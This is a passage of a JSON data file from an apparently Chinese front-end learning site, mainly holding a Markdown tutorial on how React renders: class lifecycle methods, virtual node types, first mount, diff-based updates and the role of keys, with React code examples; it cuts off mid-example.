        "vipLimit": 0,
        "createAt": "2021-07-04T12:01:00.000Z",
        "updateAt": "2024-08-10T17:05:00.000Z"
      }
    ]
  },
  "211": {
    "id": 211,
    "tagId": 13,
    "title": "react 渲染机制",
    "explanation": "# 前言\n\n文本分为两大部分讲解，一部分是`首次挂载渲染`原理，另一部分是`更新和卸载`原理，很多地方非常抽象，希望大家仔细阅读，不然容易脱节。废话不多话，开车！！\n\n# 正文\n\n在开始之前，需要一些前置知识才能帮助我们更好的理解整个渲染过程。首先就是`生命周期(16版本之后)`，为什么要讲一下生命周期？跟渲染原理有关系吗？当然有，如果你不理解渲染原理的话，更新一个嵌套很深的组件你甚至连`父与子`生命周期执行的先后顺序都不知道。本文直接对照`16`版本之后的`新生命周期`进行讲解，就不讲解老版本了。\n\n## 初探-生命周期\n\n顾名思义，跟人生一样，`生命周期`就是一个组件从`诞生`到`销毁`的过程。`React`在组件的`生命周期`中注册了一系列的`钩子函数`，支持开发者在其中注入代码，并在适当的时机运行。这里指的`生命周期`仅针对于`类组件`中的`钩子函数`。因为`生命周期`不是本文的重点，所以`Hooks`中的新增的`钩子函数`在本文中均不涉及，可以以后出个`Hooks`原理篇。\n\n![](https://static.ecool.fun//article/a9a89397-5f0d-4fc2-8407-96164423f652.awebp)\n\n从图中可以看到，我把`生命周期`分为了`挂载阶段`、`更新阶段`、`卸载阶段`三个阶段。同时，在`挂载阶段`和`更新阶段`都会运行`getDerivedStateFromProps`和`render`，卸载阶段很好理解，只有一个`componentWillUnMount`，在卸载组件之前做一些事情，通常用来`清除定时器等副作用操作`。那么`挂载阶段`和`更新阶段`中的生命周期我们来逐一看下每个运行点及作用。\n\n### 1\\. constructor\n\n在同一个类组件对象只会运行一次。所以经常来做一些`初始化`的操作。同一个组件对象被多次创建，它们的`construcotr`互不干扰。\n\n**注意：在`construcotr`中要尽量避免（最好禁止）使用`setState`。** 我们都知道使用`setState`会造成页面的重新渲染，但是在`初始化`阶段，页面都还没有将`真实DOM`挂载到页面上，那么重新渲染的又有什么意义呢。除`异步`的情况，比如`setInterval`中使用`setState`是没问题的，因为在执行的时候页面早已`渲染完成`。但也最好不要，容易一些引起奇怪的问题。\n\n```js\n    constructor(props) {\n        super(props);\n\n        this.state = {\n            num: 1\n        };\n\n        //不可以，直接Warning\n        this.setState({\n            num: this.state.num + 1\n        });\n\n        //可以使用，但不建议\n        setInterval(()=>{\n            this.setState({\n                num: this.state.num + 1\n            });\n        }, 1000);\n    }\n```\n\n![截屏2022-07-13 下午2.09.07.png](https://static.ecool.fun//article/23ee738f-f2fa-49e9-ae84-af2e4ee132e7.awebp)\n\n### 2\\. 静态属性 static getDerivedStateFromProps\n\n该方法是一个`静态属性`，在`16`版本之前不存在，在新版`生命周期`中主要用来取代`componentWillMount`和`componentWillReceiveProps`，因为这两个`老生命周期`方法在一些开发者不规范的使用下极容易产生一些`反模式`的bug。因为是`静态方法`，所以你在其中根本拿不到`this`，更不可能调用`setState`。\n\n该方法在`挂载阶段`和`更新阶段`都会运行。它有两个参数`props`和`state`当前的`属性值`和`状态`。它的返回值会合并掉当前的`状态（state）`。 如果返回了非`Object`的值，那么它啥都不会做，如果返回的是`Object`，那么它将会跟当前的状态合并，可以理解为[Object.assign](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign\")。通常情况下，几乎不怎么使用该方法。\n\n```js\n    /**\n     * 静态方法，首次挂载和更新渲染都会运行该方法\n     * @param {*} props 当前属性\n     * @param {*} state 当前状态\n     */\n    static getDerivedStateFromProps(props, state){\n        // return 1; //没用\n        return {\n            num: 999,   //合并到当前state对象\n        };\n    }\n```\n\n### 3\\. `render`\n\n最重要的`生命周期`，没有之一。用来生成`虚拟节点（vDom）`树。该方法只要遇到需要重新渲染都会运行。同样的，在`render`中也严禁使用`setState`，因为会导致无限`递归`重新渲染导致`爆栈`。\n\n```js\n    render() {\n        //严禁使用！！！\n        this.setState({\n            num: 1\n        })\n        return (\n            <>{this.state.num}</>\n        )\n    }\n```\n\n![截屏2022-07-13 下午4.03.13.png](https://static.ecool.fun//article/72dc92bb-69bb-4277-a1e8-8ac5f5a52aa3.awebp)\n\n### 4\\. `componentDidMount`\n\n该方法只会运行一次，在`首次渲染`时页面将`真实DOM`挂载完毕之后运行。通常在这里做一些`异步操作`，比如开启定时器、发起网络请求、获取`真实DOM`等。在该方法中，可以大胆使用`setState`，因为页面已经渲染完成。执行完该`钩子函数`后，组件正式进入到`活跃`状态。\n\n```js\n    componentDidMount(){\n        // 初始化或异步代码...\n        this.setState({});\n\n        setInterval(()=>{});\n\n        document.querySelectorAll(\"div\");\n    }\n```\n\n### 5\\. 性能优化 `shouldComponentUpdate`\n\n在原理图`更新阶段`中可以看到，执行完`static getDerivedStateFromProps`后，会执行该`钩子函数`。该方法通常用来做`性能优化`。它的`返回值（boolean）`决定了是否要进行渲染`更新`。该方法有两个参数`nextProps`和`nextState`表示此次更新（下一次）的`属性`和`状态`。通常我们会将当前值与此次要更新的值做比较来决定是否要进行重新渲染。\n\n在`React`中，官方给我们实现好了一个基础版的优化组件`PureComponent`，就是一个`HOC`高阶组件，内部实现就是帮我们用`shouldComponentUpdate`做了浅比较优化。如果安装了`React`代码提示的插件，我们可以直接使用`rpc` + `tab键`来生成模版。**注意：继承了`PureComponent`后不需要再使用`shouldComponentUpdate`进行优化。**\n\n```js\n    /**\n     * 决定是否要进行重新渲染\n     * @param {*} nextProps 此次更新的属性\n     * @param {*} nextState 此次更新的状态\n     * @returns {boolean}\n     */\n    shouldComponentUpdate(nextProps, nextState){\n        // 伪代码，如果当前的值和下一次的值相等，那么就没有更新渲染的必要了\n        if(this.props === nextProps && this.state === nextState){\n            return false;\n        }\n        return true;\n    }\n```\n\n### 6\\. getSnapshotBeforeUpdate\n\n如果`shouldComponentUpdate`返回是`true`，那么就会运行`render`重新生成`虚拟DOM树`来进行对比更新，该方法运行在`render`后，表示`真实DOM`已经构建完成，但还没有`渲染`到页面中。可以理解为更新前的`快照`，通常用来做一些附加的DOM操作。\n\n比如我突然想针对具有某个`class`的真实元素做一些事情。那么就可以在此方法中获取元素并修改。该函数有两个参数`prevProps`和`prevState`表示此次更新前的`属性`和`状态`，该函数的`返回值（snapshot）`会作为`componentDidUpdate`的第三个参数。\n\n```js\n    /**\n     * 获取更新前的快照，通常用来做一些附加的DOM操作\n     * @param {*} prevProps 更新前的属性\n     * @param {*} prevState 更新前的状态\n     */\n    getSnapshotBeforeUpdate(prevProps, prevState){\n        // 获取真实DOM在渲染到页面前做一些附加操作...\n        document.querySelectorAll(\"div\").forEach(it=>it.innerHTML = \"123\");\n        \n        return \"componentDidUpdate的第三个参数\";\n    }\n```\n\n### 7\\. componentDidUpdate\n\n该方法是`更新阶段`最后运行的`钩子函数`，跟`getSnapshotBeforeUpdate`不同的是，它的运行时间点是在`真实DOM`挂载到页面后。通常也会使用该方法来操作一些`真实DOM`。它有三个参数分别是`prevProps`、`prevState`、`snapshot`，跟Snapshot`钩子函数`一样，表示更新前的`属性`、`状态`、`Snapshot`钩子函数的返回值。\n\n```js\n    /**\n     * 通常用来获取真实DOM做一些操作\n     * @param {*} prevProps 更新前的属性\n     * @param {*} prevState 更新前的状态\n     * @param {*} snapshot  getSnapshotBeforeUpdate的返回值\n     */\n    componentDidUpdate(prevProps, prevState, snapshot){\n        document.querySelectorAll(\"div\").forEach(it=>it.innerHTML = snapshot);\n    }\n```\n\n### 8\\. `componentWillUnmount`\n\n如开头提到的，该`钩子函数`属于卸载阶段中唯一的方法。如果组件在`渲染`的过程中被卸载了，`React`会报出`Warning：Can't perform a React state update on an unmounted component`的警告，所以通常在组件被卸载时做`清除副作用的操作`。\n\n```js\n    componentWillUnmount(){\n        // 组件被卸载前清理副作用...\n        clearInterval(timer1);\n        clearTimeout(timer2);\n        this.setState = () => {};\n    }\n```\n\n到这里，`React生命周期`中每一个`钩子函数`的作用以及运行时间点就已经全部了解了，斯国一！等在下文中提到的时候也有一个大致的印象。大家可以先喝口水休息一下～\n\n![](https://static.ecool.fun//article/b4bd587d-8228-4149-b182-986fa30588b5.awebp)\n\n## React element（初始元素）\n\n先来认识下第一个概念，就是`React element`，what？当我伞兵？我还不知道什是`element`？别激动，这里的元素不是指`真实DOM`中的元素，而是通过`React.createElement`创建的`类似`真实DOM的元素。比如我们在开发中通过语法糖`jsx`写出来的`html`结构都是`React element`，为了跟`真实DOM`区分开来，本文就统称为`React初始元素`。\n\n为什么要有一个`初始元素`的概念？我们都知道通过`jsx`编写的`html`不可能直接`渲染`到页面上，肯定是经历了一系列的`复杂`的处理最后生成`真实DOM`挂载到页面上。那么到底是怎么样的一个过程？在我们认识一些概念之后才能更深入的理解整个过程。先看看平时写的代码哪些是`初始元素`。\n\n```js\nimport React, { PureComponent } from 'react'\n\n//创建的是React初始元素\nconst A = React.createElement(\"div\");\n//创建的是React初始元素\nconst B = <div>123</div>\n\nexport default class App extends PureComponent {\n    render() {\n        return (\n            //创建的是React初始元素\n            <div>\n                {A}\n                {B}\n            </div>\n        )\n    }\n}\n```\n\n## React vDom（虚拟节点）\n\n前面提到`React`在渲染过程中要做很多事情，所以不可能直接通过`初始元素`直接渲染。还需要一个东西就是`虚拟节点`。在本文中不涉及`React Fiber`的概念，将`vDom`树和`Fiber`树统称为`虚拟节点`。有了`初始元素`后，`React`就会根据`初始元素`和`其他可以生成虚拟节点的东西`生成`虚拟节点`。**请记住：`React`一定是通过`虚拟节点`来进行渲染的。** 接下来就是重点，除了`初始元素`能生成`虚拟节点`以外，还有哪些可能生成`虚拟节点`？总共有多少种`节点`类型？\n\n### 1\\. DOM节点（ReactDomComponent）\n\n> 此DOM非彼DOM，这里的DOM指的是`虚拟DOM节点`。当初始元素的`type`属性为`字符串`的时候`React`就会创建`虚拟DOM节点`。例如我们前面使用`jsx`直接书写的`const B = <div></div>`。它的属性就是`\"div\"`，可以打印出来看一下。\n\n![微信图片_20220714212514.png](https://static.ecool.fun//article/a8fe9690-5c29-43c2-90dd-7d3dc0f16f61.awebp)\n\n### 2\\. 组件节点（ReactComposite）\n\n> 当`初始元素`的`type`属性为`函数`或是`类`的时候，`React`就会创建`虚拟组件节点`。\n\n![65463463.png](https://static.ecool.fun//article/763f28ba-0068-41e3-888c-f6f159717456.awebp)\n\n![789789.png](https://static.ecool.fun//article/f9af6f47-c1e3-4a63-a7fc-cb0dca153283.awebp)\n\n### 3\\. 文本节点（ReactTextNode）\n\n> 顾名思义，直接书写`字符串`或者`数字`，`React`会创建为`文本节点`。比如我们可以直接用`ReactDOM.render`方法直接渲染`字符串`或`数字`。\n\n```js\nimport ReactDOM from 'react-dom/client';\n\nconst root = ReactDOM.createRoot(document.getElementById('root'));\n//root.render('一头猪');   //创建文本节点\nroot.render(123465);      //创建文本节点\n```\n\n### 4\\. 空节点（ReactEmpty）\n\n> 我们平时写`React`代码的时候经常会写三目表达式`{this.state.xxx ? <App /> : false}`用来进行条件渲染，只知道为`false`就不会渲染，那么到底是怎么一回事？其实遇到字面量`null`、`false`、`true`、`undefined`在`React`中均会被创建为一个`空节点`。在渲染过程中，如果遇到`空节点`，那么它将什么都不会做。\n\n```js\nimport ReactDOM from 'react-dom/client';\n\nconst root = ReactDOM.createRoot(document.getElementById('root'));\n//root.render(false);      //创建空节点\n//root.render(true);       //创建空节点\n//root.render(null);       //创建空节点\nroot.render(undefined);    //创建空节点\n```\n\n### 5\\. 数组节点（ReactArrayNode）\n\n> 什么？`数组`还能渲染？当然不是直接`渲染`数组本身啦。当`React`遇到`数组`时，会创建`数组节点`。但是不会直接进行`渲染`，而是将数组里的每一项拿出来，根据`不同的节点类型`去做相应的事情。**所以`数组`里的每一项只能是这里提到的`五个节点类型`**。不信？那放个对象试试。\n\n```js\nimport React from 'react';\nimport ReactDOM from 'react-dom/client';\n\nconst root = ReactDOM.createRoot(document.getElementById('root'));\n\nfunction FuncComp(){\n    return (\n        <div>组件节点-Function</div>\n    )\n}\n\nclass ClassComp extends React.Component{\n    render(){\n        return (\n            <div>组件节点-Class</div>\n        ) \n    }\n}\n\nroot.render([\n    <div>DOM节点</div>,  //创建虚拟DOM节点\n    <ClassComp />,       //创建组件节点\n    <FuncComp />,        //创建组件节点\n    false,               //创建空节点\n    \"文本节点\",           //创建文本节点\n    123456,              //创建文本节点\n    [1,2,3],             //创建数组节点\n    // {name: 1}         //对象不能生成节点，所以会报错\n]);\n```\n\n![微信图片_20220714225738.png](https://static.ecool.fun//article/1a5521a8-b508-4aae-955a-8db6c0580e0b.awebp)\n\n## 真实DOM（UI）\n\n> 通过`document.createElement`创建的元素就是`真实DOM`。了解完`初始元素`、`虚拟节点`以及`真实DOM`这几个重要的概念后，就可以进入到`原理`的学习了。 **再次强调：`React`的工作是通过`初始元素或可以生成虚拟节点的东西`生成`虚拟节点`然后针对不同的`节点类型`去做不同的事情最终生成`真实DOM`挂载到页面上！所以为什么对象不能直接被`渲染`，因为它生成不了`虚拟节点`。**（实际上是`ReactDOM`库进行渲染，为了减少混淆本文中就直接说`React`）\n\n![渲染原理.gif](https://static.ecool.fun//article/2ea2c382-8b03-456f-910b-510ecc64f776.awebp)\n\n## 首次渲染阶段\n\n如上图所示，`React`首先根据`初始元素`先生成`虚拟节点`，然后做了一系列操作后最终渲染成真实的`UI`。生成`虚拟节点`的过程上面已经讲过了，所以这里说的是根据不同的`虚拟节点`它到底做了些什么处理。\n\n### 1\\. 初始元素-DOM节点\n\n对于`初始元素`的`type`属性为字符串时，React会通过`document.createElement`创建`真实DOM`。因为`初始元素`的`type`为字符串，所以直接会根据`type`属性创建不同的`真实DOM`。创建完`真实DOM`后会立即设置该`真实DOM`的所有`属性`，比如我们直接在`jsx`中可以直接书写的`className`、`style`等等都会作用到`真实DOM`上。\n\n```js\n//jsx语法：React初始元素\nconst B = <div className=\"wrapper\" style={{ color: \"red\" }}>\n    <p className=\"text\">123</p>\n</div>\n```\n\n![1657855131681.jpg](https://static.ecool.fun//article/49843b07-cc51-4534-b270-859f571b3eaf.awebp)\n\n![222222222222.jpg](https://static.ecool.fun//article/34abb3db-a7dc-4df2-8714-055f968f7738.awebp)\n\n当然我们的`html结构`肯定不止一层，所以在设置完属性后`React`会根据`children`属性进行`递归遍历`。根据不同的`节点类型`去做不同的事情，同样的，如果`children`是`初始元素`，创建`真实DOM`、设置属性、然后检查是否有子元素。重复此步骤，一直到最后一个元素为止。遇到其他`节点类型`会做以下事情。⬇️\n\n### 2\\. 初始元素-组件节点\n\n前面提到的，如果`初始元素`的`type`属性是一个`class类`或者`function函数`时，那么会创建一个`组件节点`。所以针对`类`或`函数`组件，它的处理是不同的。\n\n-   **函数组件**\n\n对于`函数组件`会直接调用函数，将函数的`返回值`进行递归处理（看看是什么`节点类型`，然后去做对应的事情，**所以一定要返回能生成`虚拟节点`的东西**），最终生成一颗`vDOM`树。\n\n-   **类组件**\n\n对于`类组件`而言会相对麻烦一些。但前面有了`生命周期`的铺垫，结合图中`挂载阶段`来看这里理解起来就很方便了。\n\n1.  首先创建类的`实例`（调用`constructor`）。\n2.  调用`生命周期`方法`static getDerivedStateFromProps`。\n3.  调用`生命周期`方法`render`，根据`返回值`递归处理。跟函数组件处理`返回值`一样，最终生成一颗`vDom`树。\n4.  将该组件的`生命周期`方法`componentDidMount`加入到`执行队列`中等待真实DOM挂载到页面后执行（**注意：前面说了`render`是一个递归处理，所以如果一个组件存在`父子`关系的时候，那么肯定要等`子组件`渲染完`父组件`才能走出`render`，所以`子组件`的`componentDidMount`一定是比父组件`先入队列`的，肯定先运行！**）。\n\n### 3\\. 文本节点\n\n针对`文本节点`，会直接通过`document.createTextNode`创建`真实`的文本节点。\n\n### 4\\. 空节点\n\n如果生成的是`空节点`，那么它将什么`都不会做`！对，就是那么简单，啥都不做。\n\n### 5\\. 数组节点\n\n就像前面提到的一样，`React`不会直接渲染数组，而是将里面的`每一项`拿出来遍历，根据不同的`节点类型`去做不同的事，直到`递归`处理完数组里的每一项。（这里留个问题，为什么在`数组`里我们要写`key`？）\n\n### 一图胜千言\n\n当处理完了所有的`节点`后，我们的`vDom`树和`真实DOM`也创建好了，`React`会将`vDom`树保存起来，方便后续使用。然后将创建好的`真实DOM`都挂载到页面上。至此，`首次渲染`的阶段就全部结束了。有点懵？没事，正常，我们举个例子。\n\n```js\nimport React from 'react';\nimport ReactDOM from 'react-dom/client';\nconst root = ReactDOM.createRoot(document.getElementById('root'));\n\n/**\n * 组件节点-类组件\n */\nclass ClassSon extends React.Component {\n\n    constructor(props){\n        super(props);\n        console.log(\"444 ClassSon constructor\");\n    }\n\n    static getDerivedStateFromProps(props, state){\n        console.log(\"555 ClassSon getDerivedStateFromProps\");\n        return {};\n    }\n\n    componentDidMount(){\n        console.log(\"666 ClassSon componentDidMount\");\n    }\n\n    render() {\n        return (\n            <div className=\"func-wrapper\">\n                <span>\n                    textNode22\n                    {undefined}\n                </span>\n                {[false, \"textNode33\", <div>textNode44</div>]}\n            </div>\n        )\n    }\n}\n\n/**\n * 组件节点-类组件\n */\nclass ClassComp extends React.Component {\n\n    constructor(props){\n        super(props);\n        console.log(\"111 ClassComp constructor\");\n    }\n\n    static getDerivedStateFromProps(props, state){\n        console.log(\"222 ClassComp getDerivedStateFromProps\");\n        return {};\n    }\n\n    componentDidMount(){\n        console.log(\"333 ClassComp componentDidMount\");\n    }\n    \n    render() {\n        return (\n            <div className=\"class-wrapper\">\n                <ClassSon />\n                <p>textNode11</p>\n                {123456789}\n            </div>\n        )\n    }\n}\n\nroot.render(<ClassComp />);\n\n```\n\n从代码结构来看，渲染的是`ClassComp`类组件，类组件内包含了一个`函数组件`以及一些其他可以生成`虚拟节点`的东西，同样的，`函数组件`内也是一些可以生成`虚拟节点`的结构。因为用图表示比较复杂，时间可能会有点久（gif很大已压缩...，显示有点小的话麻烦`右键新标签打开`看好了）\n\n![123123.gif](https://static.ecool.fun//article/a40575a2-b990-4054-8c13-78a85b2f5643.awebp)\n\n从图中可以看到，在`ClassComp`首次挂载运行`render`的过程中，发现了`ClassSon`组件，然后又开始了一个新的`类组件`节点的渲染过程。要等到`ClassSon`和其他兄弟节点渲染完后`ClassComp`的`render`才算完成。所以`ClassSon`的`componentDidMount`一定是先进队列的。所以控制台执行顺序一定是`111`、`222`、`444`、`555`、`666`、`333`。到这里，`首次挂载`的所有过程就结束了。再喝口水休息一下～\n\n![](https://static.ecool.fun//article/b66a6d89-3d8a-472d-965b-4485891c546b.awebp)\n\n## 更新和卸载\n\n挂载完成后组件进入`活跃`状态，等待数据的更新进行重新渲染。那么到底有几种场景会触发更新？整个过程又是怎么样的，有哪些需要注意的地方？\n\n### 更新的场景\n\n-   **组件更新（`setState`）**\n\n最常见的，我们经常用`setState`来重新设置组件的`状态`进行重新渲染（本文不涉及`Hooks`概念，不讲`useState`）。使用`setState`只会更新调用此方法的类。不会涉及到兄弟节点以及父级节点。影响范围仅仅是自己的`子节点`。结合文章最前面的`生命周期`图看，步骤如下：\n\n1.  运行当前类组件的`生命周期`静态方法`static getDerivedStateFromProps`。根据返回值合并当前组件的状态。\n2.  运行当前类组件的`生命周期`方法`shouldComponentUpdate`。如果该方法返回的`false`。直接终止更新流程！\n3.  运行当前类组件的`生命周期`方法`render`，得到一个新的`vDom`树，进入新旧两棵树的`对比更新`。\n4.  将当前类组件的`生命周期`方法`getSnapshotBeforeUpdate`加入执行队列，等待将来执行。\n5.  将当前类组件的`生命周期`方法`componentDidUpdate`加入执行队列，等待将来执行。\n6.  重新生成`vDom`树。\n7.  根据`vDom`树更新`真实DOM`.\n8.  执行队列，此队列存放的是更新过程中所有新建类组件的`生命周期`方法`componentDidMount`。\n9.  执行队列，此队列存放的是更新过程涉及到原本存在的类组件的`生命周期`方法`getSnapshotBeforeUpdate`。\n10.  执行队列，此队列存放的是更新过程涉及到原本存在的类组件的`生命周期`方法`componentDidUpdate`。\n11.  执行队列，此队列存放的是更新过程中所有卸载的类组件的`生命周期`方法`componentWillUnMount`。\n\n-   **根节点更新（`ReactDOM.createRoot().render`）**\n\n在`ReactDOM`的新版本中，已经不是直接使用`ReactDOM.render`进行更新了，而是通过`createRoot(要控制的DOM区域)`的返回值来调用`render`，无论我们在嵌套多少的组件里去调用`控制区域.render`，都会直接触发`根节点`的`对比更新`。一般不会这么操作。如果触发了根节点的更新，那么后续步骤是上面`组件更新`的`6-11`步。\n\n### 对比更新过程（diff）\n\n知道了两个更新的场景以及会运行哪些`生命周期`方法后，我们来看一下具体的过程到底是怎么样的。所谓`对比更新`就是将`新vDom`树跟之前首次渲染过程中保存的`老vDom`树对比发现差异然后去做一系列操作的过程。那么问题来了，如果我们在一个`类组件`中重新渲染了，`React`怎么知道在产生的新树中它的层级呢？难道是给`vDom`树全部挂上一个不同的标识来遍历寻找更新的哪个组件吗？当然不是，我们都知道`React`的`diff`算法将之前的复杂度`O(n^3)`降为了`O(n)`。它做了以下几个假设：\n\n1.  假设此次更新的节点层级不会发生移动（直接找到旧树中的位置进行对比）。\n2.  兄弟节点之间通过`key`进行唯一标识。\n3.  如果新旧的`节点类型`不相同，那么它认为就是一个新的结构，比如之前是`初始元素div`现在变成了`初始元素span`那么它会认为整个结构全部变了，无论嵌套了多深也会全部`丢弃`重新创建。\n\n### key的作用\n\n如果前面copy了文中的代码例子就会发现在使用`数组节点`的时候，如果里面有`初始元素`，并且没有给`初始元素`添加`key`那么它会警告`Warning: Each child in a list should have a unique \"key\" prop.`。那么`key`值到底是干嘛用的呢？其实`key`的作用非常简单，仅仅是为了通过`旧节点`，寻找对应的`新节点`进行对比提高`节点`的复用率。我们来举个例子，假如现在有五个`兄弟节点`更新后变成了四个`节点`。\n\n**未添加key**\n\n![渲染原理.gif](https://static.ecool.fun//article/ea42d02d-8997-4cb3-acaa-cca1d409ff04.awebp)\n\n**添加了key**\n\n![渲染原理.gif](https://static.ecool.fun//article/e46d42c5-0633-482e-958c-3cb85c642ba2.awebp)\n\n看完两张图会发现如果有`key`的话在`其他节点`未变动的情况下复用了之前的所有`节点`。所以请尽量保持同一层级内`key`的`唯一性`和`稳定性`。这就是为什么不要用`Math.random`作为`key`的原因，跟没写一样。\n\n### 找到对比目标-节点类型一致\n\n经过假设和一系列的操作找到了需要对比的目标，如果发现`节点类型`一致，那么它会根据不同的节点类型做不同的事情。\n\n**1\\. 初始元素-DOM节点**\n\n如果是`DOM节点`，`React`会直接重用之前的`真实DOM`。将这次变化的`属性`记录下来，等待将来完成更新。然后遍历其`子节点`进行递归`对比更新`。\n\n```js\nimport React, { PureComponent } from 'react'\n\nexport default class App extends PureComponent {\n    state = {\n        flag: true\n    }\n    \n    render() {\n        console.log(\"render了\");\n        return (\n            <div className={this.state.flag ? \"wrapper\" : \"flagFlase\"}>\n                <button onClick={()=>{\n                    this.setState({\n                        flag: !this.state.flag\n                    });\n                    console.log(\"属性名变了吗现在？\", document.querySelector(\".wrapper\").className);\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n```\n\n![截屏2022-07-17 上午1.00.26.png](https://static.ecool.fun//article/48cca0f5-4b53-4a7b-8baa-d4e8a72c4b65.awebp)\n\n**2\\. 初始元素-组件节点**\n\n-   **函数组件**\n\n如果是`函数组件`，`React`仅仅是重新调用`函数`拿到新的`vDom`树，然后递归进行`对比更新`。\n\n-   **类组件**\n\n针对`类组件`，`React`也会重用之前的`实例对象`。后续步骤如下：\n\n1.  运行`生命周期`静态方法`static getDerivedStateFromProps`。将返回值合并当前状态。\n2.  运行`生命周期`方法`shouldComponentUpdate`，如果该方法返回`false`，终止当前流程。\n3.  运行`生命周期`方法`render`，得到新的`vDom`树，进行新旧两棵树的递归`对比更新`。\n4.  将`生命周期`方法`getSnapshotBeforeUpdate`加入到队列等待执行。\n5.  将`生命周期`方法`componentDidUpdate`加入到队列等待执行。\n\n```js\nimport React, {Component} from 'react'\n\nexport default class App extends Component {\n\n    static getDerivedStateFromProps(props, state){\n        console.log(\"111 getDerivedStateFromProps\");\n        return {};\n    }\n\n    shouldComponentUpdate(){\n        console.log(\"222 shouldComponentUpdate\");\n        return true;\n    }\n\n    getSnapshotBeforeUpdate(){\n        console.log(\"444 getSnapshotBeforeUpdate\");\n        return null;\n    }\n\n    componentDidUpdate(){\n        console.log(\"555 getSnapshotBeforeUpdate\")\n    }\n\n    render() {\n        console.log(\"333 render\");\n        return (\n            <div className={\"wrapper\"}>\n                <button onClick={()=>{\n                    this.setState({});\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n```\n\n![截屏2022-07-17 上午1.27.37.png](https://static.ecool.fun//article/a11c05a0-320a-49fa-b13b-e97111f3590b.awebp)\n\n**3\\. 文本节点**\n\n对于文本节点，同样的`React`也会重用之前的`真实文本节点`。将新的文本记录下来，等待将来统一更新（设置`nodeValue`）。\n\n```js\nimport React, { PureComponent } from 'react'\n\nexport default class App extends PureComponent {\n\n    state = {\n        text: \"文本节点\"\n    }\n\n    render() {\n        return (\n            <div className=\"wrapper\">\n                {this.state.text}\n                <button onClick={()=>{\n                    this.setState({\n                        text: \"新文本节点\"\n                    })\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n\n```\n\n![截屏2022-07-17 上午1.40.31.png](https://static.ecool.fun//article/5d4a36c4-42d4-4631-abf8-0e61dc56ac57.awebp)\n\n**4\\. 空节点**\n\n如果节点的类型都是`空节点`，那么`React`啥都不会做。\n\n**5\\. 数组节点**\n\n首次挂载提到的，`数组节点`不会直接渲染。在更新阶段也一样，遍历每一项，进行`对比更新`，然后去做不同的事。\n\n### 找到对比目标-节点类型不一致\n\n如果找到了对比目标，但是发现`节点类型`不一致了，就如前面所说，`React`会认为你连类型都变了，那么你的`子节点`肯定也都不一样了，就算`一万个`子节点，并且他们都是没有变化的，只有最外层的`父节点`的`节点类型`变了，照样会全部进行`卸载`重新创建，与其去一个个递归查看`子节点`，不如直接全部`卸载`重新新建。\n\n```js\nimport React, { PureComponent } from 'react'\n\nexport default class App extends PureComponent {\n\n    state = {\n        flag: true,\n    }\n\n    render() {\n        console.log(\"重新渲染render\");\n        \n        if (this.state.flag) {\n            return <span className=\"wrapper\">\n                <button onClick={() => {\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </span>\n        }\n\n        return (\n            <div className=\"wrapper\">\n                <button onClick={() => {\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n```\n\n![截屏2022-07-17 下午7.42.18.png](https://static.ecool.fun//article/31c0283e-17fd-4eb3-a05a-debc4e3a4f54.awebp)\n\n![渲染原理.gif](https://static.ecool.fun//article/c3261d1d-0587-491b-82a0-3fa4f594359c.awebp)\n\n### 未找到对比目标\n\n如果未找到对比的目标，跟`节点类型`不一致的做法类似，那么对于多出的节点进行`挂载流程`，对于旧节点进行卸载直接弃用。如果其包含子节点进行`递归卸载`。对于`初始类组件节点`会多一个步骤，那就是运行`生命周期`方法`componentWillUnmount`。**注意：尽量保持结构的稳定性，如果未添加`key`的情况下，兄弟节点更新位置前后错位一个那么后续全部的比较都会`错位`导致找不到对比目标从而进行`卸载`新建流程，对性能大打折扣。**\n\n```js\nimport React, { PureComponent } from 'react'\n\nexport default class App extends PureComponent {\n\n    state = {\n        flag: true,\n    }\n\n    render() {\n        console.log(\"重新渲染render\");\n        if (this.state.flag) {\n            return <div className=\"wrapper\">\n                <span>123</span>\n                <button onClick={() => {\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </div>\n        }\n\n        return (\n            <div className=\"wrapper\">\n                <button onClick={() => {\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n```\n\n![截屏2022-07-17 下午8.03.52.png](https://static.ecool.fun//article/f2bf72f1-073d-4a14-8510-503166704d47.awebp)\n\n![渲染原理.gif](https://static.ecool.fun//article/36b2edbb-5f43-47bf-92b2-d2bd039b1dc2.awebp)\n\n从图中可以看到，哪怕经过条件渲染前后`button`理论上没有任何变化的情况下，照样没有重用之前的`真实DOM`，如果在`button`之后还有`一万个`兄弟节点，那么也全部都找不到对比目标从而进行`卸载`重新创建流程。所以在进行`条件渲染`显示隐藏时，官方推荐以下做法：\n\n1.  控制`style：visibility`来控制显示隐藏。\n2.  在隐藏时给一个`空节点`来保证对比前后能找到同一位置。不影响后续`兄弟节点`的比较。\n\n```js\nthis.state.flag ? <div></div> : false\n```\n\n## 来点栗子加深印象\n\n**1\\. 是否重用了真实DOM**\n\n```js\nimport React, { PureComponent } from 'react'\n\nexport default class App extends PureComponent {\n\n    state = {\n        flag: true,\n    }\n\n    render() {\n        console.log(\"重新render！\");\n\n        if(this.state.flag){\n            return <div className=\"flag-true\">\n                <button onClick={()=>{\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </div>\n\n        }\n        return (\n            <div className=\"flag-false\">\n                 <button onClick={()=>{\n                    this.setState({\n                        flag: !this.state.flag\n                    })\n                }}>更新</button>\n            </div>\n        )\n    }\n}\n```\n\n![截屏2022-07-17 下午5.30.08.png](https://static.ecool.fun//article/a8acd1b4-86b3-4f03-ad8c-fa8a611fb0df.awebp)\n\n尽管从代码结构看起来像是返回了两个不同的`DOM`，但其实在更新的过程中，`React`发现他们的`节点类型`一致，所以会重用之前的`真实DOM`。**所以请注意：尽量保持`节点的类型`一致，如果更新前后`节点类型`不一致的话无论有多少子组件将全部`卸载`重新创建。**\n\n![渲染原理.gif](https://static.ecool.fun//article/dd90c619-eec0-4524-accb-ba09aeb6dce8.awebp)\n\n**2\\. 一个神奇的效果**\n\n```js\nimport React, { 